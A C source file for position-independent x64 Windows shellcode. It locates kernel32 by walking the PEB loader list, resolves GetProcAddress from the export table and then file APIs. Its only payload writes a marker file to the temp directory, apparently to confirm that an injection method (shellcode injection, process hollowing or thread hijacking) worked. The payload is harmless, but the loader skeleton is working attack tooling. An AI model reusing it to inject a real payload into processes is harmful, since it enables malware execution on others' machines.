/* shellcode_x64.c ? PIC shellcode, aligned entry, GetTempPathA runtime */

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;

typedef void *HMODULE;
typedef void *HANDLE;
typedef u32   DWORD;

typedef HMODULE (*fp_gpa_t)(HMODULE, const char *);
typedef DWORD   (*fp_gtp_t)(DWORD, char *);
typedef HANDLE  (*fp_cfa_t)(const char *, DWORD, DWORD, void*, DWORD, DWORD, HANDLE);
typedef int     (*fp_wf_t )(HANDLE, const void*, DWORD, DWORD*, void*);
typedef int     (*fp_ch_t )(HANDLE);
typedef void    (*fp_ep_t )(DWORD);

#define GENERIC_WRITE_         0x40000000u
#define CREATE_ALWAYS_         2u
#define FILE_ATTRIBUTE_NORMAL_ 0x80u
#define INVALID_HANDLE_VALUE_  ((HANDLE)(long long)-1)

void shell_body(void);

__attribute__((naked, used, noinline, section(".text.shell_entry")))
void shell_entry(void) {
    __asm__ volatile(
        "andq $-16, %rsp\n"
        "call shell_body\n"
        "ud2\n"
    );
}

__attribute__((used, noinline, section(".text.shell_entry")))
void shell_body(void) {
#define SS(n, ...) char n[] = { __VA_ARGS__ }

    SS(sn_k32,  'k','e','r','n','e','l','3','2','.','d','l','l',0);
    SS(sn_gpa,  'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0);
    SS(sn_gtp,  'G','e','t','T','e','m','p','P','a','t','h','A',0);
    SS(sn_cfa,  'C','r','e','a','t','e','F','i','l','e','A',0);
    SS(sn_wf,   'W','r','i','t','e','F','i','l','e',0);
    SS(sn_ch,   'C','l','o','s','e','H','a','n','d','l','e',0);
    SS(sn_ep,   'E','x','i','t','P','r','o','c','e','s','s',0);
    SS(sn_fb,   'C',':','\\','W','i','n','d','o','w','s','\\','T','e','m','p','\\',0);

#if METHOD_ID == 1
    SS(sn_nm,   'I','N','J','_','s','h','e','l','l','c','o','d','e','.','t','x','t',0);
    SS(sn_ms,   's','h','e','l','l','c','o','d','e',' ','O','K','\n',0);
    const int nMsg = 13;
#elif METHOD_ID == 2
    SS(sn_nm,   'I','N','J','_','h','o','l','l','o','w','i','n','g','.','t','x','t',0);
    SS(sn_ms,   'h','o','l','l','o','w','i','n','g',' ','O','K','\n',0);
    const int nMsg = 14;
#elif METHOD_ID == 3
    SS(sn_nm,   'I','N','J','_','h','i','j','a','c','k','.','t','x','t',0);
    SS(sn_ms,   'h','i','j','a','c','k',' ','O','K','\n',0);
    const int nMsg = 11;
#else
    SS(sn_nm,   'I','N','J','_','u','n','k','n','o','w','n','.','t','x','t',0);
    SS(sn_ms,   'u','n','k','n','o','w','n','\n',0);
    const int nMsg = 8;
#endif

    void *peb;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));

    char *ldr  = *(char**)((char*)peb + 0x18);
    char *head = ldr + 0x20;
    char *cur  = *(char**)head;
    void *k32  = 0;

    while (cur != head) {
        char *e    = cur - 0x10;
        u16  *wbuf = *(u16**)(e + 0x58 + 0x08);
        if (wbuf) {
            int i = 0;
            while (sn_k32[i] && wbuf[i]) {
                u16 wc = wbuf[i]; char cc = sn_k32[i];
                if (wc >= 'A' && wc <= 'Z') wc += 32;
                if (cc >= 'A' && cc <= 'Z') cc += 32;
                if ((char)wc != cc) break;
                i++;
            }
            if (sn_k32[i] == 0 && wbuf[i] == 0) { k32 = *(void**)(e + 0x30); break; }
        }
        cur = *(char**)cur;
    }
    if (!k32) { for(;;){} }

    u8 *base   = (u8*)k32;
    u32 lfanew = *(u32*)(base + 0x3C);
    u8 *nt     = base + lfanew;
    u8 *opt    = nt + 24;
    u8 *dd     = opt + 0x70;
    u8 *exp    = base + *(u32*)dd;

    u32 numNames = *(u32*)(exp + 0x18);
    u32 *names   = (u32*)(base + *(u32*)(exp + 0x20));
    u16 *ords    = (u16 *)(base + *(u32*)(exp + 0x24));
    u32 *funcs   = (u32*)(base + *(u32*)(exp + 0x1C));

    fp_gpa_t gpa = 0;
    for (u32 i = 0; i < numNames; i++) {
        const char *n = (const char*)(base + names[i]);
        int j = 0;
        while (n[j] && sn_gpa[j] && n[j] == sn_gpa[j]) j++;
        if (n[j] == 0 && sn_gpa[j] == 0) { gpa = (fp_gpa_t)(base + funcs[ords[i]]); break; }
    }
    if (!gpa) { for(;;){} }

    fp_gtp_t gtp = (fp_gtp_t)gpa(k32, sn_gtp);
    fp_cfa_t cfa = (fp_cfa_t)gpa(k32, sn_cfa);
    fp_wf_t  wf  = (fp_wf_t )gpa(k32, sn_wf);
    fp_ch_t  ch  = (fp_ch_t )gpa(k32, sn_ch);
    fp_ep_t  ep  = (fp_ep_t )gpa(k32, sn_ep);
    if (!cfa || !wf || !ch || !ep) { for(;;){} }

    /* resolve temp dir at runtime */
    char path[260];
    DWORD tlen = 0;
    if (gtp) {
        tlen = gtp(260, path);          /* returns length incl. trailing '\' */
    }
    if (tlen == 0 || tlen >= 250) {
        /* fallback to C:\Windows\Temp\ */
        int i = 0;
        while (sn_fb[i] && i < 250) { path[i] = sn_fb[i]; i++; }
        path[i] = 0;
        tlen = (DWORD)i;
    }

    int k = 0;
    while (sn_nm[k] && (tlen + k) < 258) { path[tlen + k] = sn_nm[k]; k++; }
    path[tlen + k] = 0;

    HANDLE h = cfa(path, GENERIC_WRITE_, 0, 0,
                   CREATE_ALWAYS_, FILE_ATTRIBUTE_NORMAL_, 0);
    if (h != INVALID_HANDLE_VALUE_) {
        DWORD w = 0;
        wf(h, sn_ms, nMsg, &w, 0);
        ch(h);
    }

    ep(0);
    for(;;){}
}
